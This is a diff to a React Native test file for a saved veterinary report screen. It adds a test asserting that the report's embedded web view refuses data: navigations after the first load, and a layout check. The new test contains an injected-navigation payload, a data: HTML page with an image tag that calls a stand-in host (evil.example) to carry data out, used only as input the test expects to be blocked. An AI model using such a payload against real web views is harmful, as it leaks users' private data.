@@ -2,6 +2,7 @@
 // that show nothing, whose report it is, and the one action that never reads as updating it.
 
 import React from 'react';
+import { StyleSheet } from 'react-native';
 import { act, render, fireEvent, waitFor } from '@testing-library/react-native';
 
 const mockPush = jest.fn();
@@ -52,7 +53,7 @@ jest.mock('../../lib/vetVisits', () => ({
   readVetVisitsHome: (...a: unknown[]) => mockHome(...a),
 }));
 
-import SavedReportScreen from './[id]';
+import SavedReportScreen, { savedCopyLoadAllowed } from './[id]';
 import { boxedPreviewHtml } from '../../components/reportV2/ReportPreviewV2';
 import { EXAM_CSP } from '../../lib/examRoom';
 
@@ -249,6 +250,21 @@ describe('boxed in like the preview (CUL-2487)', () => {
     }
     expect(web.props.onShouldStartLoadWithRequest({ url: 'about:blank' })).toBe(true);
   });
+
+  it('a data: URL passes only as the inline document itself, never once the page has loaded (privacy pass 1)', async () => {
+    const view = render(<SavedReportScreen />);
+    await waitFor(() => expect(view.getByTestId('report-copy')).toBeTruthy());
+    const web = () => view.getByTestId('report-copy');
+    const hop = 'data:text/html,<img src="https://evil.example/?d=';
+    // Some Android builds report the first load of an inline document as data:.
+    expect(web().props.onShouldStartLoadWithRequest({ url: 'data:text/html;charset=utf-8,x' })).toBe(true);
+    act(() => web().props.onLoadEnd());
+    // After it, a data: hop (an injected refresh to a document with no CSP) is refused.
+    expect(web().props.onShouldStartLoadWithRequest({ url: hop })).toBe(false);
+    expect(web().props.onShouldStartLoadWithRequest({ url: 'about:blank' })).toBe(true);
+    expect(savedCopyLoadAllowed(hop, true)).toBe(false);
+    expect(savedCopyLoadAllowed('https://evil.example/', false)).toBe(false);
+  });
 });
 
 describe('the bars never show without their warning (CUL-2467)', () => {
@@ -270,6 +286,8 @@ describe('the bars never show without their warning (CUL-2467)', () => {
     expect(json.indexOf('"report-copy-warning"')).toBeGreaterThan(-1);
     expect(json.indexOf('"report-copy-warning"')).toBeLessThan(json.indexOf('"report-copy"'));
     expect(pin.props.style).not.toEqual(expect.objectContaining({ position: 'absolute' }));
+    // Never taller than the paper: it shrinks and scrolls rather than clip (adversarial pass 1).
+    expect(StyleSheet.flatten(pin.props.style)).toEqual(expect.objectContaining({ flexGrow: 0, flexShrink: 1 }));
   });
 
   it('a printed page with no confounder pins nothing', async () => {
